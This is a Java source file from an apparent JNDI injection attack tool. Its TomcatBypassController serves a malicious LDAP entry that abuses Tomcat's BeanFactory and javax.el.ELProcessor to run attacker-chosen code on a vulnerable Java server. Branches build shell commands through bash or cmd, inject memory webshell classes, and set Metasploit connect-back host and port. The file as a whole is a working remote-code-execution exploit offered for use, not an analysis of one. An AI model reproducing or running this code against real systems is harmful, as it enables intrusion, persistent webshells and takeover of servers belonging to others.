package com.qi4l.jndi.controllers;

import com.qi4l.jndi.enumtypes.GadgetType;
import com.qi4l.jndi.exceptions.IncorrectParamsException;
import com.qi4l.jndi.exceptions.UnSupportedGadgetTypeException;
import com.qi4l.jndi.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.InjShell;
import com.qi4l.jndi.gadgets.utils.Util;
import com.qi4l.jndi.gadgets.utils.handle.ClassNameHandler;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.cli.CommandLine;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.io.IOException;

import static org.fusesource.jansi.Ansi.ansi;


@LdapMapping(uri = {"/tomcatbypass"})
public class TomcatBypassController implements LdapController {
    public static CommandLine cmdLine;
    private String     payloadType;
    private String[]   params;
    private GadgetType gadgetType;

    /**
     * 发送LDAP ResourceRef结果和重定向URL
     *
     * @param result InMemoryInterceptedSearchResult类型的结果
     * @param base   基本远程参考负载字符串
     * @throws Exception 异常
     */
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + "  @|green with javax.el.ELProcessor payload|@"));
            System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");
            Entry e = new Entry(base);
            e.addAttribute("javaClassName", "java.lang.String");
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "x=eval"));
            TomcatBypassHelper helper = new TomcatBypassHelper();
            String             code   = null;

            if (payloadType.contains("E-")) {
                String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
                code = InjShell.injectClass(EchoClass);
            }

            if (payloadType.contains("M-")) {
                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                InjShell.init(params);
                Class<?> classQ = Gadgets.createClassT(ClassName1);
                code = InjShell.injectClass(classQ);
            }

            if (payloadType.contains("command")) {
                code = helper.getExecCode(params[0]);
            }

            String payloadTemplate = "{" +
                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                    ".newInstance().getEngineByName(\"JavaScript\")" +
                    ".eval(\"{replacement}\")" +
                    "}";
            String finalPayload = payloadTemplate.replace("{replacement}", code);
            ref.add(new StringRefAddr("x", finalPayload));
            e.addAttribute("javaSerializedData", Util.serialize(ref));
            // 将条目发送至结果中，并将结果设置为成功
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    /**
     * 处理传入的参数 base
     *
     * @param base 传入的参数
     * @throws UnSupportedPayloadTypeException 不支持的载荷类型异常
     * @throws IncorrectParamsException        错误的参数异常
     * @throws UnSupportedGadgetTypeException  不支持的 Gadget 类型异常
     */
    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try {
            base = base.replace('\\', '/');
            int fistIndex   = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                payloadType = base.substring(fistIndex + 1, secondIndex);
                System.out.println(ansi().render("@|green [+] PaylaodType : |@" + payloadType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
            }
            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex != -1) {
                if (thirdIndex < 0) thirdIndex = base.length();
                try {
                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                } catch (IllegalArgumentException e) {
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(secondIndex + 1, thirdIndex));
                }
            }

            if (gadgetType == GadgetType.base64) {
                String cmd = Util.getCmdFromBase(base);
                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
                params = new String[]{cmd};
            }

            if (gadgetType == GadgetType.shell) {
                String   cmd1         = Util.getCmdFromBase(base);
                byte[]   decodedBytes = Util.base64Decode(cmd1);
                String   cmd          = new String(decodedBytes);
                String[] cmdArray     = cmd.split(" ");
                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
                params = cmdArray;
            }

            if (gadgetType == GadgetType.msf) {
                String[] results1 = Util.getIPAndPortFromBase(base);
                Config.rhost = results1[0];
                Config.rport = results1[1];
                System.out.println("[+] RemotHost: " + results1[0]);
                System.out.println("[+] RemotPort: " + results1[1]);
                params = results1;
            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    private class TomcatBypassHelper {

        public String getExecCode(String cmd) throws IOException {

            String code = "var strs=new Array(3);\n" +
                    "        if(java.io.File.separator.equals('/')){\n" +
                    "            strs[0]='/bin/bash';\n" +
                    "            strs[1]='-c';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }else{\n" +
                    "            strs[0]='cmd';\n" +
                    "            strs[1]='/C';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }\n" +
                    "        java.lang.Runtime.getRuntime().exec(strs);";

            return code;
        }
    }
}